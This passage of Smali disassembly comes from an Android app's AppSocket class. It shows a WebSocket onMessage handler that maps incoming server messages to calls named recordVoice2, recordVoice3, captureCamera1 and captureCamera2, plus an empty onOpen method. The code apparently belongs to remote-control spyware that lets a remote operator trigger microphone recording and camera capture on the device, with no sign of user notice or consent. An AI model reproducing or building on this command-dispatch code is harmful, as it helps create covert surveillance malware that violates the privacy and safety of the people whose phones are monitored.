    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-7$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    .line 64
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->recordVoice2()V

    goto :goto_0

    .line 66
    :cond_9
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-8$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 67
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->recordVoice3()V

    goto :goto_0

    .line 69
    :cond_a
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-9$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    .line 70
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->captureCamera1()V

    goto :goto_0

    .line 72
    :cond_b
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-10$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 73
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->captureCamera2()V

    .line 77
    :cond_c
    :goto_0
    return-void
.end method

.method public onOpen(Lokhttp3/WebSocket;Lokhttp3/Response;)V
    .locals 1
    .param p1, "webSocket"    # Lokhttp3/WebSocket;
    .param p2, "response"    # Lokhttp3/Response;

    const-string v0, "webSocket"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "response"

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 79
    return-void
.end method
